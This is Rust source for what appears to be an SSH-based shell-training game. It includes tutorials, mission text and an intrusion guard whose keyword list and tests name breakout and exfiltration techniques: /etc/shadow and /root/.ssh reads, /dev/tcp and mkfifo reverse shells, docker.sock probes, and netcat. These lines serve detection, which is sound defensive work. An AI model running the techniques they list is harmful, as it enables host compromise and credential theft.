        out.push_str("  - awk-patrol  : Extract fields from /data/node-registry.csv with awk\n");
        out.push_str("  - chain-ops   : Use && and || to chain conditional commands\n");
        out.push_str("  - sediment    : Edit /logs/access.log streams with sed\n");
        out.push_str("  Each awards 20 reputation (vs 10 for starters).\n");
        out.push('\n');
        out.push_str("Story frame\n");
        out.push_str("  - Ghost Rail suffered the first blackout.\n");
        out.push_str("  - vault-sat-9 dropped offline right after GLASS-AXON-13 surfaced.\n");
        out.push_str("  - CorpSim is training replacements while the city argues about sabotage vs key theft.\n");
        out.push('\n');
        out.push_str("Progression systems\n");
        out.push_str("  - Status and progression: status, missions, gate, events\n");
        out.push_str("  - Economy: shop list, auction list|sell|bid|buyout\n");
        out.push_str("  - Scripts: scripts market, scripts run <name>\n");
        out.push_str("  - PvP: pvp roster, pvp challenge <user>, pvp attack|defend|script\n");
        out.push_str("  - Daily value: daily, leaderboard [N]\n");
        out.push('\n');
        out.push_str("Difficulty and risk\n");
        out.push_str("  - Set tier: tier noob|gud|hardcore\n");
        out.push_str("  - Hardcore rule: 3 deaths permanently zeroes account\n");
        out.push_str("  - REDLINE mode: mode redline    (disable flash with settings flash off)\n");
        out.push('\n');
        out.push_str("Security rule\n");
        out.push_str("  - Any breakout/probing attempt triggers permanent zero + disconnect.\n");
        out
    }

    fn shell_survival_guide(&self) -> String {
        let mut out = self.render_section_banner("SHELL SURVIVAL GUIDE");
        out.push_str("Never used a terminal before?\n");
        out.push_str("  - Run `tutorial start` for a hands-on guided walkthrough (6 steps).\n");
        out.push_str(
            "  - Check the TUTORIAL track on the mission board for 5 beginner missions.\n",
        );
        out.push('\n');
        out.push_str("Read-only first steps\n");
        out.push_str("  - pwd                      # show your current path\n");
        out.push_str("  - ls /logs                 # inspect files before opening them\n");
        out.push_str("  - cat /missions/story-so-far.txt\n");
        out.push('\n');
        out.push_str("Filter and count\n");
        out.push_str("  - grep token /logs/neon-gateway.log\n");
        out.push_str("  - cat /logs/neon-gateway.log | grep token | wc -l\n");
        out.push('\n');
        out.push_str("Save output for later\n");
        out.push_str("  - grep WARN /logs/neon-gateway.log > /tmp/warnings.txt\n");
        out.push_str("  - cat /tmp/warnings.txt\n");
        out.push('\n');
        out.push_str("Reuse values\n");
        out.push_str("  - TARGET=vault-sat-9\n");
        out.push_str("  - echo $TARGET\n");
        out.push_str("  - echo $?                  # last exit code, 0 means success\n");
        out.push('\n');
        out.push_str("When you get stuck\n");
        out.push_str("  - Run one command at a time before building a pipeline.\n");
        out.push_str("  - Read /missions/rookie-ops.txt and /data/lore/field-manual.txt.\n");
        out.push_str(
            "  - Use briefing <mission-code> to get a mission-specific starter command.\n",
        );
        out
    }

    fn story_briefing(&self) -> String {
        let mut out = self.render_section_banner("OPERATIVE BRIEFING");
        out.push_str("Situation\n");
        out.push_str(
            "  Ghost Rail lost sync three nights ago. Since then, vault-sat-9 has stayed dark and a beacon named GLASS-AXON-13 keeps showing up in gateway logs.\n",
        );
        out.push_str(
            "  CorpSim calls this onboarding, but every mission file in this sim is built from live cleanup traffic.\n",
        );
        out.push('\n');
        out.push_str("First moves\n");
        out.push_str(
            "  - tutorial start          # guided 6-step walkthrough (best for beginners)\n",
        );
        out.push_str("  - tutorial next           # advance after running each command\n");
        out.push_str("  - guide shell\n");
        out.push_str("  - cat /missions/rookie-ops.txt\n");
        out.push_str(
            "  - missions                # tutorial-track missions (nav-101, read-101, etc.)\n",
        );
        out.push_str("  - briefing pipes-101\n");
        out.push_str("  - accept keys-vault\n");
        out.push('\n');
        out.push_str("Story files\n");
        out.push_str("  - /missions/story-so-far.txt\n");
        out.push_str("  - /data/lore/ghost-rail-dossier.txt\n");
        out.push_str("  - /data/lore/netcity-fragment.txt\n");
        out.push('\n');
        out.push_str("Mission help\n");
        out.push_str("  Use: briefing <mission-code>\n");
        out.push_str("  Recommended starter order: pipes-101 -> log-hunt -> dedupe-city\n");
        out
    }

    fn render_mission_briefing(&self, mission: &world::MissionDefinition) -> String {
        let mut out = self.render_section_banner(&format!("MISSION BRIEF // {}", mission.code));
        out.push_str(&format!("{}\n", mission.title));
        out.push('\n');
        out.push_str("Why it matters\n");
        out.push_str(&format!("  {}\n", mission.story_beat));
        out.push('\n');
        out.push_str("What you practice\n");
        out.push_str(&format!("  {}\n", mission.summary));
        out.push('\n');
        out.push_str("First command to try\n");
        out.push_str(&format!("  {}\n", mission.suggested_command));
        out.push('\n');
        out.push_str("Hint\n");
        out.push_str(&format!("  {}\n", mission.hint));
        out
    }

    fn welcome_banner(&self) -> String {
        let theme = Theme::for_mode(self.mode.clone());
        let mut out = String::new();
        out.push_str(&self.render_mode_banner(self.mode.clone()));
        out.push('\n');
        out.push_str(lore_message(self.mode.clone()));
        out.push('\n');
        out.push_str(&self.render_section_banner("BOOT HUD"));
        out.push_str(&format!(
            "{}Next{} tutorial start -> briefing -> missions -> gate -> mode netcity\n",
            theme.accent, RESET
        ));
        out.push_str("Type `help` for the full command matrix.\n");
        out.push_str("Type `tutorial start` for a guided shell walkthrough (new to terminals? start here).\n");
        out.push_str("Type `guide` for step-by-step onboarding and progression.\n");
        out.push_str("Type `guide shell` for bash fundamentals inside the sim.\n");
        out.push_str("Type `briefing` for the story so far and mission-specific hints.\n");
        out.push('\n');
        out.push_str(&self.quickstart_guide());
        out.push_str("Starter files: /missions/rookie-ops.txt, /missions/story-so-far.txt\n");
        out.push_str(
            "Host breakout/probing attempts trigger permanent account zero + disconnect.\n",
        );
        if self.pending_admin_passphrase {
            out.push_str(
                "Private admin bootstrap: enter passphrase to generate one-time key blob.\n",
            );
        }
        out
    }

    fn prompt(&self) -> String {
        self.shell_state
            .as_ref()
            .map(ShellState::prompt)
            .unwrap_or_else(|| "guest@boot:/$ ".to_owned())
    }

    fn render_mode_banner(&self, mode: Mode) -> String {
        if self.pty_columns > 0 && self.pty_columns < 36 {
            let theme = Theme::for_mode(mode.clone());
            return format!("{}[ {} ]{}", theme.primary, mode.as_label(), RESET);
        }
        mode_banner_adaptive(
            mode,
            self.flash_enabled,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_section_banner(&self, title: &str) -> String {
        section_banner_adaptive(
            self.mode.clone(),
            title,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_for_client(&self, text: &str) -> String {
        let raw = if self.supports_ansi {
            text.to_owned()
        } else {
            strip_ansi_sequences(text)
        };
        normalize_line_endings(&raw)
    }

    fn send_text(
        &self,
        session: &mut server::Session,
        channel: ChannelId,
        text: &str,
    ) -> Result<(), anyhow::Error> {
        session.data(channel, CryptoVec::from(self.render_for_client(text)))?;
        Ok(())
    }

    async fn submit_line(
        &mut self,
        session: &mut server::Session,
        channel: ChannelId,
    ) -> Result<bool, anyhow::Error> {
        if self.line_buffer.is_empty() {
            self.send_text(session, channel, "\n")?;
            self.send_text(session, channel, &self.prompt())?;
            return Ok(false);
        }

        let line = String::from_utf8_lossy(&self.line_buffer).to_string();
        self.line_buffer.clear();
        self.send_text(session, channel, "\n")?;

        let (out, code, should_close) = match self.run_line(&line).await {
            Ok(v) => v,
            Err(err) => (format!("{err}\n"), 1, false),
        };

        if !out.is_empty() {
            self.send_text(session, channel, &out)?;
        }
        session.exit_status_request(channel, code as u32)?;

        if should_close {
            session.eof(channel)?;
            session.close(channel)?;
            return Ok(true);
        }

        self.send_text(session, channel, &self.prompt())?;
        Ok(false)
    }
}

impl server::Server for GameServer {
    type Handler = GameSession;

    fn new_client(&mut self, peer_addr: Option<SocketAddr>) -> Self::Handler {
        GameSession::new(self.app.clone(), peer_addr)
    }

    fn handle_session_error(&mut self, error: <Self::Handler as server::Handler>::Error) {
        warn!("session error: {error:?}");
    }
}

impl server::Handler for GameSession {
    type Error = anyhow::Error;

    async fn auth_none(&mut self, user: &str) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey_offered(
        &mut self,
        user: &str,
        public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        let fp = sha256_hex(&format!("{public_key:?}"));
        self.offered_fingerprints.push(format!("SHA256:{fp}"));
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey(
        &mut self,
        user: &str,
        _public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_succeeded(&mut self, _session: &mut server::Session) -> Result<(), Self::Error> {
        if let Err(err) = self.initialize_identity().await {
            error!("failed to init identity: {err:#}");
        }
        Ok(())
    }

    async fn channel_open_session(
        &mut self,
        _channel: Channel<Msg>,
        _session: &mut server::Session,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }

    async fn pty_request(
        &mut self,
        channel: ChannelId,
        term: &str,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        _modes: &[(russh::Pty, u32)],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.supports_ansi = terminal_supports_ansi(term);
        self.supports_unicode = terminal_supports_unicode(term);
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn env_request(
        &mut self,
        channel: ChannelId,
        variable_name: &str,
        variable_value: &str,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        let var = variable_name.to_ascii_uppercase();
        if (var == "LANG" || var == "LC_ALL") && !locale_supports_unicode(variable_value) {
            self.supports_unicode = false;
        }
        session.channel_success(channel)?;
        Ok(())
    }

    async fn window_change_request(
        &mut self,
        channel: ChannelId,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn shell_request(
        &mut self,
        channel: ChannelId,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        self.send_text(session, channel, &self.welcome_banner())?;
        self.send_text(session, channel, &self.prompt())?;
        Ok(())
    }

    async fn exec_request(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        let line = String::from_utf8_lossy(data).trim().to_owned();
        let (out, code, _) = self
            .run_line(&line)
            .await
            .unwrap_or_else(|err| (format!("Execution error: {err}\n"), 1, false));
        self.send_text(session, channel, &out)?;
        session.exit_status_request(channel, code as u32)?;
        session.eof(channel)?;
        session.close(channel)?;
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        for byte in data {
            match *byte {
                b'\r' => {
                    self.pending_lf_after_cr = true;
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                b'\n' => {
                    if self.pending_lf_after_cr {
                        self.pending_lf_after_cr = false;
                        continue;
                    }
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                3 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    self.line_buffer.clear();
                    self.send_text(session, channel, "^C\n")?;
                    self.send_text(session, channel, &self.prompt())?;
                }
                127 | 8 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    if !self.line_buffer.is_empty() {
                        self.line_buffer.pop();
                        session.data(channel, CryptoVec::from("\x08 \x08"))?;
                    }
                }
                0x1b => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 8;
                }
                b => {
                    self.pending_lf_after_cr = false;
                    if self.escape_sequence_remaining > 0 {
                        self.escape_sequence_remaining =
                            self.escape_sequence_remaining.saturating_sub(1);
                        if b.is_ascii_alphabetic() || b == b'~' {
                            self.escape_sequence_remaining = 0;
                        }
                        continue;
                    }
                    self.line_buffer.push(b);
                    session.data(channel, CryptoVec::from(vec![b]))?;
                }
            }
        }
        Ok(())
    }
}

fn sanitize_prompt_user(input: &str) -> String {
    let base = strip_ansi_sequences(input);
    let short = base.split('@').next().unwrap_or_default();
    let cleaned = short
        .chars()
        .take(24)
        .filter(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.'))
        .collect::<String>();
    if cleaned.is_empty() {
        "guest".to_owned()
    } else {
        cleaned
    }
}

fn terminal_supports_ansi(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    !t.is_empty() && t != "dumb" && t != "cons25"
}

fn terminal_supports_unicode(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    if t.is_empty() {
        return false;
    }
    !matches!(
        t.as_str(),
        "dumb" | "cons25" | "linux" | "ansi" | "vt100" | "vt102" | "vt220"
    )
}

fn locale_supports_unicode(locale: &str) -> bool {
    let l = locale.trim().to_ascii_lowercase();
    l.contains("utf-8") || l.contains("utf8")
}

fn strip_ansi_sequences(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] != 0x1b {
            out.push(bytes[i]);
            i += 1;
            continue;
        }

        i += 1;
        if i >= bytes.len() {
            break;
        }
        if bytes[i] == b'[' {
            i += 1;
            while i < bytes.len() {
                let b = bytes[i];
                i += 1;
                if (b'@'..=b'~').contains(&b) {
                    break;
                }
            }
            continue;
        }

        i += 1;
    }

    String::from_utf8_lossy(&out).into_owned()
}

fn normalize_line_endings(input: &str) -> String {
    let mut out = String::with_capacity(input.len() + 8);
    let mut prev_was_cr = false;
    for ch in input.chars() {
        match ch {
            '\n' => {
                if !prev_was_cr {
                    out.push('\r');
                }
                out.push('\n');
                prev_was_cr = false;
            }
            '\r' => {
                out.push('\r');
                prev_was_cr = true;
            }
            _ => {
                out.push(ch);
                prev_was_cr = false;
            }
        }
    }
    out
}

fn escape_attempt_reason(line: &str) -> Option<&'static str> {
    let lower = line.to_ascii_lowercase();
    let trimmed = lower.trim();
    let checks: [(&str, &str); 20] = [
        ("std::process::command", "forbidden host process API probe"),
        (
            "tokio::process::command",
            "forbidden async process API probe",
        ),
        ("/var/run/docker.sock", "container socket breakout probe"),
        ("/proc/", "host filesystem probe"),
        ("/etc/passwd", "host credential probe"),
        ("/root/.ssh", "root credential probe"),
        ("powershell.exe", "host shell invocation attempt"),
        ("pwsh -", "host shell invocation attempt"),
        ("cmd.exe /c", "host shell invocation attempt"),
        ("/etc/shadow", "host shadow file probe"),
        ("/etc/sudoers", "host privilege escalation probe"),
        ("/etc/crontab", "host cron probe"),
        ("/dev/mem", "host memory device probe"),
        ("ld_preload", "dynamic linker injection probe"),
        ("ld_library_path=/", "dynamic linker path injection probe"),
        ("/proc/self", "host process self-probe"),
        ("mkfifo", "named pipe reverse shell probe"),
        ("base64 -d", "encoded payload execution probe"),
        ("/dev/tcp/", "bash tcp redirect probe"),
        ("/dev/udp/", "bash udp redirect probe"),
    ];

    for (needle, reason) in checks {
        if trimmed.contains(needle) {
            return Some(reason);
        }
    }

    let mut normalized = String::with_capacity(trimmed.len());
    for ch in trimmed.chars() {
        if matches!(ch, '|' | ';' | '&') {
            normalized.push('\n');
        } else {
            normalized.push(ch);
        }
    }

    for segment in normalized.lines() {
        let mut parts = segment.split_whitespace();
        let Some(cmd) = parts.next() else {
            continue;
        };
        let rest = parts.collect::<Vec<_>>();
        match cmd {
            "/bin/bash" | "/bin/sh" | "/bin/zsh" | "powershell" | "powershell.exe" | "pwsh"
            | "cmd" | "cmd.exe" | "zsh" | "fish" => {
                return Some("host shell invocation attempt");
            }
            "bash" | "sh" => {
                if rest.first() == Some(&"-c") {
                    return Some("host shell execution attempt");
                }
                return Some("host shell escalation attempt");
            }
            "python" | "python3" | "perl" | "ruby" | "node" | "lua" | "php" => {
                if rest.contains(&"-c")
                    || rest.contains(&"-e")
                    || rest.contains(&"-r")
                    || rest.contains(&"--eval")
                {
                    return Some("runtime escape attempt");
                }
                return Some("runtime interpreter launch attempt");
            }
            "sudo" | "su" => return Some("privilege escalation attempt"),
            "docker" | "podman" => return Some("container breakout tooling probe"),
            "nsenter" => return Some("namespace escape attempt"),
            "chroot" => return Some("chroot escape attempt"),
            "systemctl" => return Some("host service control probe"),
            "nc" | "ncat" | "netcat" | "socat" => return Some("network pivot attempt"),
            "nmap" | "masscan" | "zmap" => return Some("network scan attempt"),
            "ssh" | "scp" | "sftp" | "telnet" | "ftp" | "rsh" | "rlogin" => {
                return Some("network pivot attempt");
            }
            "curl" | "wget" => {
                if rest
                    .iter()
                    .any(|arg| arg.starts_with("http://") || arg.starts_with("https://"))
                {
                    return Some("external host/network call attempt");
                }
            }
            _ => {}
        }
    }

    None
}

fn is_game_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "help"
            | "guide"
            | "briefing"
            | "tutorial"
            | "missions"
            | "accept"
            | "submit"
            | "inventory"
            | "shop"
            | "auction"
            | "chat"
            | "mail"
            | "party"
            | "dossier"
            | "stance"
            | "hack"
            | "history"
            | "eva"
            | "campaign"
            | "mode"
            | "gate"
            | "keyvault"
            | "settings"
            | "status"
            | "events"
            | "leaderboard"
            | "scripts"
            | "daily"
            | "tier"
            | "pvp"
            | "relay"
    )
}

/// Render the lesson text for a single interactive tutorial step.
fn render_tutorial_step(step: u8, banner: &str) -> String {
    let mut out = banner.to_owned();
    out.push_str(&format!("Step {}/6\n\n", step));
    match step {
        1 => {
            out.push_str("WHERE AM I?\n");
            out.push_str("Every shell session starts somewhere. Find out where you are.\n\n");
            out.push_str(
                "  Concept: pwd (print working directory) shows your current location.\n\n",
            );
            out.push_str("  Run this:\n");
            out.push_str("    pwd\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        2 => {
            out.push_str("LOOK AROUND\n");
            out.push_str("Now see what's in the /missions directory.\n\n");
            out.push_str("  Concept: ls (list) shows the files and folders in a directory.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    ls /missions\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        3 => {
            out.push_str("READ A FILE\n");
            out.push_str("Read the story file to understand what happened to Ghost Rail.\n\n");
            out.push_str("  Concept: cat (concatenate) prints the entire contents of a file.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    cat /missions/story-so-far.txt\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        4 => {
            out.push_str("SEARCH FOR A WORD\n");
            out.push_str("The gateway log is noisy. Find just the lines with 'token' in them.\n\n");
            out.push_str("  Concept: grep PATTERN FILE shows only lines containing PATTERN.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    grep token /logs/neon-gateway.log\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        5 => {
            out.push_str("COUNT RESULTS WITH A PIPE\n");
            out.push_str("How many token lines are there? Connect grep to wc (word count).\n\n");
            out.push_str(
                "  Concept: The | symbol sends the output of one command into the next.\n",
            );
            out.push_str("  wc -l counts lines.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    cat /logs/neon-gateway.log | grep token | wc -l\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        6 => {
            out.push_str("SAVE YOUR WORK\n");
            out.push_str("Save the warnings to a file so you can review them later.\n\n");
            out.push_str("  Concept: > redirects output into a file (overwriting it).\n");
            out.push_str("  >> appends to the end instead of overwriting.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    grep WARN /logs/neon-gateway.log > /tmp/warnings.txt\n\n");
            out.push_str("Then run `tutorial next` to complete the tutorial.\n");
        }
        _ => {
            out.push_str("Invalid step. Run `tutorial reset` to start over.\n");
        }
    }
    out
}

/// Check whether the player has completed a tutorial step based on their command log.
fn validate_tutorial_step(step: u8, log: Option<&HashMap<String, String>>) -> bool {
    let log = match log {
        Some(l) => l,
        None => return false,
    };
    // Concatenate all command outputs for substring search
    let all_output: String = log.values().cloned().collect::<Vec<_>>().join("\n");
    let all_commands: String = log.keys().cloned().collect::<Vec<_>>().join("\n");
    match step {
        1 => {
            // pwd: output should contain /
            log.keys().any(|k| k.starts_with("pwd")) || all_output.contains('/')
        }
        2 => {
            // ls /missions: output should contain rookie-ops
            all_output.contains("rookie-ops")
                || all_commands.contains("ls /missions")
                || all_commands.contains("ls /missions/")
        }
        3 => {
            // cat a file: output should mention Ghost Rail
            all_output.contains("Ghost Rail") || all_output.contains("ghost-rail")
        }
        4 => {
            // grep token: output should contain token
            all_commands.contains("grep token")
                || all_commands.contains("grep WARN")
                || (all_output.contains("token") && all_commands.contains("grep"))
        }
        5 => {
            // pipe: must have used | (evidenced by wc -l output which is a number)
            all_commands.contains('|') || all_commands.contains("wc")
        }
        6 => {
            // redirect: must have used > (command contains >)
            all_commands.contains('>') || log.keys().any(|k| k.contains("> /tmp/"))
        }
        _ => false,
    }
}

fn mission_track_label(code: &str, required: bool, starter: bool) -> &'static str {
    if required {
        "required"
    } else if world::TUTORIAL_CODES.contains(&code) {
        "tutorial"
    } else if starter {
        "starter"
    } else if world::INTERMEDIATE_CODES.contains(&code) {
        "intermed"
    } else if world::EXPERT_CODES.contains(&code) {
        "expert"
    } else {
        "advanced"
    }
}

struct ScriptMarketEntry {
    name: &'static str,
    description: &'static str,
    source: &'static str,
}

fn script_market() -> &'static [ScriptMarketEntry] {
    &[
        ScriptMarketEntry {
            name: "node-scan",
            description: "List visible NetCity nodes",
            source: "let nodes = scan_nodes(); for n in nodes { print(n); }",
        },
        ScriptMarketEntry {
            name: "token-hunt",
            description: "Extract token lines from mission logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "token"));"#,
        },
        ScriptMarketEntry {
            name: "warn-trace",
            description: "Trace warning signals in gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "WARN"));"#,
        },
        ScriptMarketEntry {
            name: "error-pulse",
            description: "Surface ERROR entries from gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "node-count",
            description: "Count visible nodes in the current sector",
            source: "let nodes = scan_nodes(); print(nodes.len);",
        },
        ScriptMarketEntry {
            name: "auth-sweep",
            description: "Count rejected auth attempts from auth log",
            source: r#"let data = read_virtual("/var/log/auth.log"); print(grep(data, "REJECT"));"#,
        },
        ScriptMarketEntry {
            name: "inventory-sku",
            description: "Extract SKU field from the data inventory",
            source: r#"let data = read_virtual("/data/inventory.tsv"); print(grep(data, "nb-"));"#,
        },
        ScriptMarketEntry {
            name: "error-filter",
            description: "Extract ERROR and FATAL lines from events log (regex-hunt)",
            source: r#"let data = read_virtual("/var/log/events.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "top-score",
            description: "Extract top-scorer name from pipeline.csv (pipeline-pro)",
            source: r#"let data = read_virtual("/data/pipeline.csv"); print(grep(data, "neo"));"#,
        },
        ScriptMarketEntry {
            name: "config-dump",
            description: "Display current sim-config values (var-play)",
            source: r#"let data = read_virtual("/etc/sim-config"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "json-keys",
            description: "Extract key names from node-status.json (json-crack)",
            source: r#"let data = read_virtual("/data/node-status.json"); print(grep(data, ":"));"#,
        },
        ScriptMarketEntry {
            name: "seq-report",
            description: "List numbered tasks from tasks.txt (seq-master)",
            source: r#"let data = read_virtual("/home/player/tasks.txt"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "col-format",
            description: "Format netmap.tsv as aligned table (column-view)",
            source: r#"let data = read_virtual("/data/netmap.tsv"); print(data);"#,
        },
    ]
}

fn style_metrics(parsed: &shell::ParsedLine) -> Option<(usize, usize)> {
    if parsed.segments.is_empty() {
        return None;
    }

    let mut max_chain_depth = 0usize;
    let mut unique_tools = HashSet::new();
    for segment in &parsed.segments {
        max_chain_depth = max_chain_depth.max(segment.pipeline.commands.len());
        for cmd in &segment.pipeline.commands {
            unique_tools.insert(cmd.program.clone());
        }
    }

    if max_chain_depth < 2 && unique_tools.len() < 3 {
        return None;
    }

    Some((max_chain_depth, unique_tools.len()))
}

fn sha256_hex(input: &str) -> String {
    use sha2::{Digest, Sha256};

    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    format!("{:x}", hasher.finalize())
}

fn generate_admin_keypair(passphrase: &str) -> Result<(String, String)> {
    let mut rng = OsRng;
    let private = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;
    let encrypted = private.encrypt(&mut rng, passphrase)?;
    let private_blob = encrypted
        .to_openssh(russh::keys::ssh_key::LineEnding::LF)?
        .to_string();
    let public_line = private.public_key().to_openssh()?;
    Ok((public_line, private_blob))
}

fn load_or_generate_host_key(path: &Path) -> Result<russh::keys::PrivateKey> {
    if let Ok(key) = russh::keys::PrivateKey::read_openssh_file(path) {
        info!(path = %path.display(), "loaded persistent SSH host key");
        return Ok(key);
    }

    let mut rng = OsRng;
    let key = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;

    if let Some(parent) = path.parent() {
        if let Err(err) = std::fs::create_dir_all(parent) {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to create host key directory; using ephemeral key for this run"
            );
            return Ok(key);
        }
    }

    match key.write_openssh_file(path, russh::keys::ssh_key::LineEnding::LF) {
        Ok(()) => {
            info!(path = %path.display(), "wrote SSH host key");
            Ok(key)
        }
        Err(err) => {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to persist SSH host key; using ephemeral key for this run"
            );
            Ok(key)
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info,ssh_hunt_server=debug".into()),
        )
        .with_target(false)
        .init();

    let config_path =
        std::env::var("GAME_CONFIG_PATH").unwrap_or_else(|_| "/data/config.yaml".to_owned());
    let admin_secret_path = std::env::var("ADMIN_SECRET_PATH")
        .unwrap_or_else(|_| "/data/secrets/admin.yaml".to_owned());
    let hidden_ops_path = std::env::var("HIDDEN_OPS_PATH")
        .unwrap_or_else(|_| "/data/secrets/hidden_ops.yaml".to_owned());
    let host_key_path = std::env::var("SSH_HOST_KEY_PATH")
        .unwrap_or_else(|_| "/data/secrets/ssh_host_ed25519".to_owned());

    let cfg = config::load_config(&config_path)?;
    let admin_secret = config::load_admin_secret(&admin_secret_path)?;
    let hidden_ops: HiddenOpsConfig = config::load_hidden_ops(&hidden_ops_path)?;

    if args.healthcheck {
        let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
        let pool = timeout(Duration::from_secs(3), PgPool::connect(&db_url))
            .await
            .context("database healthcheck timed out")??;
        let _ping: i32 = sqlx::query_scalar("SELECT 1")
            .fetch_one(&pool)
            .await
            .context("database healthcheck query failed")?;
        println!("ok");
        return Ok(());
    }

    let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
    let pool = PgPool::connect(&db_url).await?;
    sqlx::migrate!("../../migrations").run(&pool).await?;

    let world = Arc::new(WorldService::new(Some(pool), hidden_ops));
    let shell = Arc::new(ShellEngine::with_registry(builtins::default_registry()));
    let script = Arc::new(ScriptEngine::new(ScriptPolicy::default()));

    let app = Arc::new(AppState {
        cfg: cfg.clone(),
        world,
        shell,
        script,
        admin_secret,
    });

    let host_key = load_or_generate_host_key(Path::new(&host_key_path))
        .with_context(|| format!("unable to prepare host key at {host_key_path}"))?;

    let server_cfg = russh::server::Config {
        inactivity_timeout: Some(Duration::from_secs(3600)),
        auth_rejection_time: Duration::from_millis(250),
        auth_rejection_time_initial: Some(Duration::from_millis(0)),
        keys: vec![host_key],
        ..Default::default()
    };
    let server_cfg = Arc::new(server_cfg);

    let mut server = GameServer { app };
    let mut retry_delay = Duration::from_secs(1);
    loop {
        match TcpListener::bind(&cfg.server.listen).await {
            Ok(listener) => {
                info!(listen = %cfg.server.listen, "starting SSH-Hunt server");
                retry_delay = Duration::from_secs(1);
                match server.run_on_socket(server_cfg.clone(), &listener).await {
                    Ok(()) => warn!("server loop exited unexpectedly; restarting listener"),
                    Err(err) => error!(error = ?err, "server loop error; restarting listener"),
                }
            }
            Err(err) => {
                error!(
                    listen = %cfg.server.listen,
                    error = ?err,
                    "failed to bind SSH listener; retrying"
                );
            }
        }
        sleep(retry_delay).await;
        retry_delay = std::cmp::min(retry_delay * 2, Duration::from_secs(10));
    }

    #[allow(unreachable_code)]
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn style_metrics_requires_complexity() {
        let engine = ShellEngine::default();
        let env = HashMap::new();
        let simple = engine.parse("ls", &env).unwrap();
        assert!(style_metrics(&simple).is_none());

        let complex = engine
            .parse("cat /logs/neon-gateway.log | grep token | wc -l", &env)
            .unwrap();
        assert_eq!(style_metrics(&complex), Some((3, 3)));
    }

    #[test]
    fn intrusion_guard_flags_escape_attempts() {
        assert_eq!(
            escape_attempt_reason("bash -c 'id'"),
            Some("host shell execution attempt")
        );
        assert_eq!(
            escape_attempt_reason("pwsh --eval whoami"),
            Some("host shell invocation attempt")
        );
        assert_eq!(
            escape_attempt_reason("python3"),
            Some("runtime interpreter launch attempt")
        );
        assert_eq!(
            escape_attempt_reason("cat /var/run/docker.sock"),
            Some("container socket breakout probe")
        );
        assert_eq!(
            escape_attempt_reason("ssh admin@example.com"),
            Some("network pivot attempt")
        );
        assert_eq!(escape_attempt_reason("cat /logs/neon-gateway.log"), None);
        assert_eq!(escape_attempt_reason("echo docker"), None);
        assert_eq!(escape_attempt_reason("chat global bash -c 'id'"), None);

        // Extended pattern coverage
        assert_eq!(
